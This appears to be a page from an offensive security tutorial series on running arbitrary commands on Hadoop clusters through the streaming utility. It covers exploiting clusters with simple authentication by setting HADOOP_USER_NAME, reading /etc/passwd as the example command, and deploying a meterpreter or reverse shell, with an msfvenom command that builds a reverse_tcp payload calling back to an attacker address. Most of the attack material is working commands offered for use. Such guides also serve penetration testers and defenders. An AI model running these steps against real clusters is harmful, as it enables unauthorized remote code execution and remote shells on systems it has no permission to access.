Executing remote commands
=========================

Description
-----------
This tutorial explains how to execute arbitrary commands on an Hadoop cluster

Prerequisites
-------------
1. A **working attack environment**: Hadoop binaries and the target cluster configuration are needed. Follow the following tutorials to set them up: 
  * [Setting up an Hadoop attack environment](../Setting%20up%20an%20Hadoop%20attack%20environment)
  * [Getting the target environment configuration](../Getting%20the%20target%20environment%20configuration)  
  
2. Then you need to be able to access the following **Hadoop services through the network**:
  * **YARN ResourceManager**: usually on ports 8030, 8031, 8032, 8033 or 8050
  * **NameNode metadata service** in order to [browse the HDFS datalake](../Browsing%20the%20HDFS%20datalake): usually on port 8020
  * **DataNode data transfer service** in order to upload/download file: usually on port 50010
  
3. Finally you have to look up which **authentication level** is deployed, the cluster you are attacking might have:
  * Either **simple authentication** enforced: in that case you don't need credentials, you can simply specify which user you want to be with the `HADOOP_USER_NAME`
  * Or **Kerberos authentication** enforced (called ["Hadoop Secure Mode"](https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/SecureMode.html)): in that case you need proper Kerberos tickets
  
  
Executing a single command
--------------------------
1. Go to the directory where you decompressed Hadoop binaries (`/opt` in the tutorial):
  ```
  $ cd /opt/hadoop-2.7.3/
  ```
  
2. Call the Hadoop streaming utility:
  ```
  $ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your single command> -reducer NONE
  ```
  
Some explanations might be useful:
  * `-input <a non empty file on HDFS>`: this will be provided as input to MapReduce for the command to be executed, just put at least a character in that file, this file is useless for our objective 
  * `-output <a nonexistant directory on HDFS>`: this directory will be used by MapReduce to write the result, either `_SUCCESS` or failure
  * `-mapper <your single command>`: the command to execute, for instance `"/bin/cat /etc/passwd"`. The output result will be written in the `-output` directory
  * `-reducer NONE`: there is no need for a reducer to execute a single command, a mapper is enough  

Note that for certain distributions you might need to put **additional parameters** (with `-D`) to submit a MapReduce job, for instance on **HortonWorks cluster** you need the **`-Dhdp.version=<version>`** option: you can find this information when you grab the target cluster configuration.  

Then when the job has terminated its execution: 
* Check the output result:
  ```
  $ hadoop fs -ls <a nonexistant directory on HDFS>
  ```
  
* Display the output:
  ```
  $ hadoop fs -cat <a nonexistant directory on HDFS>/part-00000
  ```
  
  
Executing a meterpreter/reverse shell
-------------------------------------
Due to the [limitations](#limitations) inherent to Hadoop, it is recommended to **use a `reverse shell` payload** (meterpreter or plain reverse_shell)
```
$ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your executable meterpreter path on HDFS> -reducer NONE -file <your executable meterpreter path on your local attacking environment> -background
```
Again, some explanations:
  * `-file <your executable meterpreter path on your local attacking environment>`: your local meterpreter executable will be uploaded on HDFS, for instance `"/root/foobar/meterpreter.elf"`
  * `-mapper <your executable meterpreter>`: an HDFS path to your executable meterpreter, by default put `"./meterpreter.elf"`
  * `-background`: this starts the job without waiting for its completion  

Then **start your meterpreter listener**, wait **few dozen of seconds** (yes it is quite slow) before gaining your **meterpreter session**.  
  
  
Limitations
-----------
Due to the **distributed nature of a MapReduce job**, it is not possible to specify on which node you want to execute your payload. There is **no mechanism** ensuring that the payload you will launch on **two successive jobs** will execute on the **same cluster member**.  
As a consequence **you can't know beforehand the server IP where your payload will be executed**: so just use a `reverse shell` payload and **gently wait for your shell to arrive**.

It is possible to use a meterpreter, for instance generated as following:
```
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP address> -f elf -o msf.payload
```
Note that on certain Hadoop clusters the meterpreter does work, the session is created, but calling the `shell` command leads to session termination for unknown reasons. In that case use a plain metasploit `reverse_shell` payload.
  
  
References
----------
Check the [Hadoop Streaming page](https://hadoop.apache.org/docs/r2.7.2/hadoop-streaming/HadoopStreaming.html) for any additional help